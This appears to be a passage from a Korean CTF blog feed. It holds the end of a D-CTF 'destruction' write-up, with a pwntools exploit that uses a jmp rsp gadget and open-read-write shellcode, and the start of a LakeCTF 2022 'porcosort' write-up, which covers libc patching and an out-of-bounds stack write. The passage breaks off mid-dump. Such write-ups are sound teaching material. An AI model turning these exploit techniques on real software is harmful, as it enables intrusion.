class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/dctf/destruction$ seccomp-tools dump ./destruction </span><br><span class="line">Acces denied intruder detected!!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p><code>open</code>, <code>read</code>, <code>exit</code>, <code>write</code> syscall을 사용할 수 있다.<br>즉,.. 쉘을 따는 문제가 아니라 flag를 ORW 해야하는 문제이다. </p><p>입력할 수 있는 바이트가 0x38인데 반해 <code>buf</code> 크기가 0x20이다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────</span><br><span class="line">*RAX  0x0</span><br><span class="line"> RBX  0x400910 ◂— push   r15</span><br><span class="line">*RCX  0xfff0</span><br><span class="line">*RDX  0x4</span><br><span class="line">*RDI  0x400a09 ◂— outsd  dx, dword ptr fs:[rsi] /* &#x27;done&#x27; */</span><br><span class="line"> RSI  0x7ffeb916ffe0 ◂— 0x41414100656e6f64 /* &#x27;done&#x27; */</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x7c</span><br><span class="line"> R10  0xfffffffffffff40f</span><br><span class="line">*R11  0x4</span><br><span class="line"> R12  0x4005c0 ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7ffeb91700f0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line">*RBP  0x4141414141414141 (&#x27;AAAAAAAA&#x27;)</span><br><span class="line">*RSP  0x7ffeb9170008 ◂— 0x4242424242424242 (&#x27;BBBBBBBB&#x27;)</span><br><span class="line">*RIP  0x40090a ◂— ret    </span><br><span class="line">──────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────</span><br><span class="line">   0x4008ef    test   eax, eax</span><br><span class="line">   0x4008f1    jne    0x4008fa                      &lt;0x4008fa&gt;</span><br><span class="line"> </span><br><span class="line">   0x4008f3    mov    eax, 0</span><br><span class="line">   0x4008f8    jmp    0x400909                      &lt;0x400909&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x400909    leave  </span><br><span class="line"> ► 0x40090a    ret    &lt;0x4242424242424242&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7ffeb9170008 ◂— 0x4242424242424242 (&#x27;BBBBBBBB&#x27;)</span><br><span class="line">01:0008│     0x7ffeb9170010 ◂— 0x4343434343434343 (&#x27;CCCCCCCC&#x27;)</span><br><span class="line">02:0010│     0x7ffeb9170018 —▸ 0x7ffeb91700f8 —▸ 0x7ffeb9170565 ◂— &#x27;./destruction&#x27;</span><br><span class="line">03:0018│     0x7ffeb9170020 ◂— 0x190f647a0</span><br><span class="line">04:0020│     0x7ffeb9170028 —▸ 0x400886 ◂— push   rbp</span><br><span class="line">05:0028│     0x7ffeb9170030 —▸ 0x400910 ◂— push   r15</span><br><span class="line">06:0030│     0x7ffeb9170038 ◂— 0x29e4545047266017</span><br><span class="line">07:0038│     0x7ffeb9170040 —▸ 0x4005c0 ◂— xor    ebp, ebp</span><br></pre></td></tr></table></figure><p>당연하게도 ret 자리에 바로 쉘코드를 넣으면 안된다. <code>jmp rsp</code>라는 좋은 가젯이 존재해서 그것을 사용해야 한다. 그러면 <code>rsp</code>로 jump 하여 그 주소에 저장된 코드를 실행하려고 할 것이다. 만약 <code>0x4242424242424242</code> 대신 <code>jmp rsp</code> 가젯 주소를 넣는다면? </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffeb9170008: 0x4141414141414141 0x0000000000400882 // jmp    rsp</span><br><span class="line">0x7ffeb9170010: 0x4343434343434343 ...</span><br></pre></td></tr></table></figure><p><code>0x4343434343434343</code> 가 실행될 것이다.</p><p>아무튼 이거에 유의해서 <code>ret</code>에 <code>jmp rsp</code> 주소를 넣어주면 된다. 그러면 우리가 적을 수 있는 바이트 수는 오직 8바이트만이 남는다. </p><p>흔한 트릭은 큰 바이트를 입력할 수 있는 <code>read</code> syscall을 호출하는 것이다. 이걸 8바이트로 구성하면 된다. <code>read</code> syscall을 구성하는 데에는 3개의 인수가 필요하다. 아니 syscall인까 4개가 필요하다.</p><p><code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RAX  0x0</span><br><span class="line">RDI  0x400a09 ◂— outsd  dx, dword ptr fs:[rsi] /* &#x27;done&#x27; */</span><br><span class="line">RSI  0x7ffd095c5020 ◂— 0x41414100656e6f64 /* &#x27;done&#x27; */</span><br><span class="line">RDX  0x4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">asm(&#x27;&#x27;&#x27;</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    mov dh, 0x2</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p><code>dh</code>에 0x2를 대입하면 <code>rdx</code>는 결국 0x00000204가 된다. </p><p>flag 위치는 문제에서 알려줬으니, 그 이후엔 seccomp에 명시된 syscall들을 사용하면서 편하게 ORW 하면 된다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./destruction&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./destruction&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;done\x00&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x28</span>-<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="comment">#payload += &#x27;B&#x27; * 0x8 # ret</span></span><br><span class="line">payload += p64(<span class="number">0x400882</span>) <span class="comment"># jmp rsp</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        xor rdi, rdi</span></span><br><span class="line"><span class="string">        mov dh, 0x2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += <span class="string">&#x27;\x90&#x27;</span>*<span class="number">100</span></span><br><span class="line">shellcode += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        push rsi</span></span><br><span class="line"><span class="string">        mov rax, 0x7478742e67616c66</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        mov rax, 0x2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        mov rdx, 0x60</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rax, 1</span></span><br><span class="line"><span class="string">        mov rdi, 1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Team P3WP3W’s writeups (no link)</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> D-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seccomp </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - porcosort (Dockerfile, libc, oob)</title>
      <link href="/221004-lakectf2022-porcosort/"/>
      <url>/221004-lakectf2022-porcosort/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 22.04<br>사용자 제공 파일: 바이너리, 도커파일</p><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>libc 때문에.. 고생을 좀 했지만 결론적으로는 잘 해결했다. </p><p>맨 처음에 Ubuntu 20.04에서 분석 및 익스 진행하려고 했는데 실행이 잘 되지 않아 그냥 Ubuntu 22.04에서 진행했다. 버전을 올린 이유는 20.04에서 실행할 때 GLibc? 그 버전이 낮아서 실행이 안된다고 에러 문구가 떴기 때문에 당연하게도(?) 22.04로 버전을 올릴 생각을 하였기 때문이다. 하지만 결론적으로 Ubuntu 22.04의 libc도 아니었기 때문에(arch의 libc였음) 굳이 22.04로 버전을 안올리고 문제를 풀 수도 있었다.</p><p>ctf 챌린지에서 도커파일을 제공하는 이유는 libc 버전 때문이다. libc 파일을 던져준 것은 아니지만 libc를 거져준 것이나 다름없다. 알고있었지만 활용하는 방법을 제대로 알지 못했다. libc 때문에 삽질을 많이 해서 결국 롸업을 찾아보고 해당 부분을 바로 해결할 수 있었다. </p><p><a href="https://blog.csotiriou.com/post/lakectf-2022-qualifier-porcosort-pwn/#1-setup">https://blog.csotiriou.com/post/lakectf-2022-qualifier-porcosort-pwn/#1-setup</a></p><p>이번 기회로 도커파일을 눈여겨봐야겠다는 생각과 libc를 가져오고 patch하는 방법을 배웠다. 이제라도 알게 되어서 다행이다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="로컬에서-문제-환경-세팅하기-feat-도커파일이-주어졌을-때-libc-가져오기"><a href="#로컬에서-문제-환경-세팅하기-feat-도커파일이-주어졌을-때-libc-가져오기" class="headerlink" title="로컬에서 문제 환경 세팅하기 (feat. 도커파일이 주어졌을 때 libc 가져오기)"></a>로컬에서 문제 환경 세팅하기 (feat. 도커파일이 주어졌을 때 libc 가져오기)</h3><p>Ubuntu 22.04에서 <code>ldd</code> 명령을 통해 바이너리에 매핑된 라이브러리를 알 수 있다. Ubuntu 20.04에서 진행했을 때는 버전에 맞는 libc가 없어서 실행조차 되지 않았는데, 여기선 그래도 실행은 된다. 하지만 아무리 실행이 되더라도 remote와 환경이 다를 수도 있기 때문에 제공된 도커파일을 꼭 확인해야 한다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ldd porcosort </span><br><span class="line">linux-vdso.so.1 (0x00007ffc8615e000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f976d66e000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f976d8ad000)</span><br></pre></td></tr></table></figure><p>도커파일을 확인해보자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM docker.io/library/archlinux@sha256:2bfe247c46221b0770325d69ec195b50455b2865588665e6926b2d1168982e67 AS builder</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>문제 환경이 Ubuntu가 아니라 arch linux임을 알 수 있다. 저기로 접속해서 libc를 가져와 바이너리를 patch하는 작업을 진행하자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -v `pwd`:/data archlinux@sha256:2bfe247c46221b0770325d69ec195b50455b2865588665e6926b2d1168982e67 bash</span><br></pre></td></tr></table></figure><p>도커를 실행하면 컨테이너에 접속할 수 있다.<br>다른 터미널 창을 열어서 컨테이너로 문제 바이너리를 넣어주고 <code>ldd</code> 명령어로 매핑된 라이브러리를 확인해보자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /home/jir4vvit/ctf/lake/porcosort2/porcorsort ce9c17249f0e:/home/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ce9c17249f0e home]# ldd porcosort</span><br><span class="line">linux-vdso.so.1 (0x00007fff4e6ca000)</span><br><span class="line">libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007f2f35895000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f2f35aae000)</span><br></pre></td></tr></table></figure><p>다른 터미널에서 아래 두 명령어로 컨테이너 안의 ld와 libc 파일을 가져오자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp ce9c17249f0e:/usr/lib/libc.so.6 /home/jir4vvit/ctf/lake/porcosort2/</span><br><span class="line">docker cp ce9c17249f0e:/usr/lib64/ld-linux-x86-64.so.2 /home/jir4vvit/ctf/lake/porcosort2/</span><br></pre></td></tr></table></figure><p>그럼 이제 로컬에 ld와 libc가 저장이 되고, <code>patchelf</code>를 이용해서 바이너리를 패치할 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ patchelf --set-rpath . --replace-needed libc.so.6 ./libc.so.6 porcosort</span><br><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ patchelf --set-rpath . --set-interpreter ./ld-linux-x86-64.so.2 porcosort</span><br><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ldd porcosort </span><br><span class="line">linux-vdso.so.1 (0x00007ffff7d92000)</span><br><span class="line">./libc.so.6 (0x00007f3122b16000)</span><br><span class="line">./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f3122d2f000)</span><br></pre></td></tr></table></figure><p><code>--set-interpreter &lt;ld&gt;</code>: 다운받은 ld(로더)를 지정<br><code>--replace-needed &lt;libc&gt;</code>: libc 교체 </p><p>그럼 이제 문제 환경(remote)와 local이 똑같아졌다! 가젯 찾을 일 있으면 가져온 libc나 ld에서 가젯찾으면 된다.</p><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>전부 다 걸려있다. :(</p><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><p>우리의 친구 IDA와 함께 차근차근 분석하면서 취약점을 찾아보자.</p><h4 id="vuln-함수"><a href="#vuln-함수" class="headerlink" title="vuln 함수"></a>vuln 함수</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">vuln</span><span class="params">(<span class="type">unsigned</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-1A4h]</span></span><br><span class="line">  __int64 stack_buf[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 sort_cnt; <span class="comment">// [rsp+1A0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+1A8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">47</span>; ++i )</span><br><span class="line">    stack_buf[i] = _bss_start;</span><br><span class="line">  __asm &#123; rdrand  rbx &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Have a gift: %p\n&quot;</span>, stack_buf[(_RBX ^ a1) % <span class="number">0x30</span>]);<span class="comment">// _IO_2_1_stdout_</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many numbers to sort? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;sort_cnt);            <span class="comment">// 48</span></span><br><span class="line">  <span class="keyword">if</span> ( sort_cnt &gt; <span class="number">48</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  read_numbers(stack_buf, sort_cnt);</span><br><span class="line">  get_gnomed(stack_buf, sort_cnt);              <span class="comment">// 정렬하는 코드</span></span><br><span class="line">                                                <span class="comment">// 여기 sort_cnt 값 조작 가능 (48보다 큰 수 넣기 가능)</span></span><br><span class="line">                                                <span class="comment">// 정확히는 read_numbers에서 oob write 발생</span></span><br><span class="line">  <span class="keyword">return</span> canary - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vuln</code> 함수에서 <code>_IO_2_1_stdout_</code>을 출력해 준다. (gdb로 바로 찍어봤다.)<br>그리고 어떠한 수를 입력받고 그 입력값을 인자로 <code>read_numbers</code> 함수와 <code>get_gnomed</code> 함수를 호출한다.</p><h4 id="read-numbers-함수"><a href="#read-numbers-함수" class="headerlink" title="read_numbers 함수"></a>read_numbers 함수</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_numbers</span><span class="params">(_QWORD *buf, __int64 cnt)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  result = cnt;</span><br><span class="line">  <span class="keyword">for</span> ( i = cnt; i &gt; <span class="number">0</span>; --i )                   <span class="comment">// 뒤에서부터 채우기</span></span><br><span class="line">                                                <span class="comment">// cnt ~ 1</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    buf[i] = <span class="string">&#x27;*&#x27;</span>;                               <span class="comment">// *로 채우기</span></span><br><span class="line">    result = __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;buf[i]);   <span class="comment">// * 찍은 곳에 값 쓰기 가능</span></span><br><span class="line">                                                <span class="comment">// (위에서 한 * 채우기는 그냥 초기화 작업)</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>두 번째 인자 <code>cnt</code>는 나의 입력 값이다. 결론적으로 스택에 내가 원하는 데이터를 넣을 수 있다.</p><p>이때 oob write가 가능하다. 인자로 넘어온 <code>buf</code>는 크기가 48이다. 이때 <code>cnt</code>가 48이라면 <code>&amp;buf[48]</code>에 접근하여 쓰기가 가능하다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;buf[48] ~ &amp;buf[1]</span><br></pre></td></tr></table></figure><p>oob write가 발생하지 않으려면(원래대로라면) 아래처럼 0부터 <code>cnt-1</code>까지만 접근해야겠지.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;buf[48-1] ~ &amp;buf[0]</span><br></pre></td></tr></table></figure><p>그럼 이제 우리가 oob를 통해 접근할 수 있는 <code>&amp;buf[48]</code>에 저장된 값이 뭔지 궁금하다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__int64 stack_buf[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 sort_cnt; <span class="comment">// [rsp+1A0h] [rbp-20h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+1A8h] [rbp-18h]</span></span><br></pre></td></tr></table></figure><p><code>buf</code> 바로 밑에 <code>cnt</code>가 존재한다. 그렇다. <code>&amp;buf[48]</code>에는 우리의 입력값인 <code>cnt</code>가 저장되어 있다. 이 말 즉슨.. <code>read_numbers</code> 함수가 끝나고 다음 호출될 <code>get_gnomed</code> 함수의 인자를 조작 가능하다는 의미이다.</p><h4 id="get-gnomed-함수"><a href="#get-gnomed-함수" class="headerlink" title="get_gnomed 함수"></a>get_gnomed 함수</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">get_gnomed</span><span class="params">(_QWORD *buf, __int64 cnt)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *curr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  curr = buf;</span><br><span class="line">  <span class="keyword">while</span> ( curr &lt; &amp;buf[cnt] )                    <span class="comment">// 처음엔 stdout addr</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( curr == buf || *curr &gt;= *(curr - <span class="number">1</span>) ) <span class="comment">// 음수로 크기 비교</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++curr;                                   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *curr ^= *(curr - <span class="number">1</span>);</span><br><span class="line">      *(curr - <span class="number">1</span>) ^= *curr;</span><br><span class="line">      *curr ^= *(curr - <span class="number">1</span>);</span><br><span class="line">      --curr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>그냥 크기 순으로 정렬하는 코드이다. 대소비교에 마우스를 올려보면 <code>*curr &gt;= *(curr-1)</code> 에서 signed로 비교를 하고 있는 것을 확인할 수 있다. 참고로 이 사실은 익스하는 데에 있어서 아주 중요하다.. </p><p>스택에 원하는 값들을 적으면 결국 여기에서 다시 정렬하게 되는데, 크기 순으로 정렬이 되니까 값을 어떻게 넣을 지 생각을 잘해야 한다.</p><p>음 취약점을 설명하는 해당 부분에서는 살짝 맞지 않는 것 같지만 이어서 설명하는 것이 이해하기에 쉬운 것 같아 바로 스택을 보여주겠다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe3265c040:0x00007f29d7a406c00x8000000000006873</span><br><span class="line">0x7ffe3265c050:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c060:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c070:0x80000000000068730x8000000000006873</span><br><span class="line">...</span><br><span class="line">0x7ffe3265c190:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1a0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1b0:0x00007f29d788ca400x00007f29d786a1d6</span><br><span class="line">0x7ffe3265c1c0:0x00000000000000390xa614ed753417eb00 // 0x7ffe3265c1c8: canary</span><br><span class="line">0x7ffe3265c1d0:0x00000000000000000xa3d3707cd6109c68</span><br><span 